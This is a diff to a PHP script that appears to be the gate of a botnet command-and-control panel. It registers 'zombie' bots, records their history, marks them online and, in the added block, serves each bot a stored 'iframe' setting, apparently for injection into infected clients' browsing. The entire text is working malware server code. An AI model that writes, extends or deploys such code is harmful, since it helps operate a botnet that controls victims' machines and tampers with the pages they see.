@@ -22,6 +22,21 @@ if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['
         $update->execute();
     }
 }
+elseif(isset($_GET['iframe']) && $_GET['iframe'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
+    $zombie = $_GET['zombie'];
+    $object = "iframe";
+
+    $select = $bdd->prepare("SELECT * FROM bot_settings WHERE setting_name = :setting_name AND bot_id = :bot_id AND available = '1'");
+    $select->bindParam(':setting_name', $object);
+    $select->bindParam(':bot_id', $zombie);
+    $select->execute();
+    $result = $select->fetch();
+    if($result['setting_value'] != ''){
+        echo trim($result['setting_value']);
+        return true;
+    }
+    return false;
+}
 elseif(isset($_GET['history']) && $_GET['history'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
     $history = $_GET['history'];
     $zombie = $_GET['zombie'];
@@ -76,11 +91,9 @@ elseif(isset($_GET['add']) && $_GET['add'] != '' && isset($_GET['version']) && $
     }
 }
 elseif(isset($_GET['online']) && $_GET['online'] != ''){
-    echo "ok";
     $zombie = $_GET['online'];
     $online = $bdd->prepare("UPDATE bots SET online = '1' WHERE name = :name");
     $online->bindParam(':name', $zombie);
     $online->execute();
-    echo "ok";
 }
 ?>
